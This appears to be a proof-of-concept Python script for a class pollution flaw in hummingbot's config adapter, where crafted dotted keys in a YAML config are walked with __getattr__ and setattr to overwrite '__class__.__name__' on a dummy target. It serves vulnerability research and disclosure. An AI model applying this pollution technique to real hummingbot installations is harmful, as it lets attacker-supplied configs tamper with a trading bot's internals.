# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: ClientConfigAdapter.decrypt_all_secure_data
# Type: get-attr-set-attr
# Trigger: Malicious config YAML file with dot-separated keys
#
# hummingbot loads strategy configs from YAML files. The config adapter
# traverses dot-separated field paths via __getattr__ + setattr.
# A malicious config file with crafted field paths triggers class pollution.

import sys
import types
import os

# Mock heavy dependencies
for mod_name in [
    'hummingbot', 'hummingbot.client', 'hummingbot.client.config',
    'hummingbot.client.config.client_config_map',
    'hummingbot.client.config.config_data_types',
    'hummingbot.client.config.config_var',
    'hummingbot.client.config.security',
    'ruamel', 'ruamel.yaml',
    'pydantic', 'pydantic.fields', 'pydantic_core',
]:
    if mod_name not in sys.modules:
        sys.modules[mod_name] = types.ModuleType(mod_name)

sys.modules['pydantic'].SecretStr = str
sys.modules['pydantic'].ValidationError = Exception
sys.modules['pydantic.fields'].FieldInfo = type('FieldInfo', (), {})
sys.modules['pydantic_core'].PydanticUndefinedType = type('PydanticUndefinedType', (), {})
sys.modules['hummingbot'].get_strategy_list = lambda: []
sys.modules['hummingbot'].root_path = lambda: '/tmp'
sys.modules['hummingbot.client.config.config_data_types'].BaseClientModel = object
sys.modules['hummingbot.client.config.config_data_types'].ClientConfigEnum = object
sys.modules['hummingbot.client.config.config_data_types'].ClientFieldData = type('ClientFieldData', (), {})
sys.modules['hummingbot.client.config.client_config_map'].ClientConfigMap = object
sys.modules['hummingbot.client.config.config_var'].ConfigVar = object

from hummingbot.client.config.config_helpers import ClientConfigAdapter

class Target: pass
target = Target()

adapter = ClientConfigAdapter.__new__(ClientConfigAdapter)
adapter._hb_config = target

payload_value = "pwnd"

def run_poc():
  # Simulates loading a malicious YAML config with dotted field paths:
  # strategy_config.yaml:
  #   __class__.__name__: pwnd
  config_path = "__class__.__name__"
  *intermediate_items, final = config_path.split(".")
  config_model = adapter
  for attr in intermediate_items:
    config_model = config_model.__getattr__(attr)
  setattr(config_model, final, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
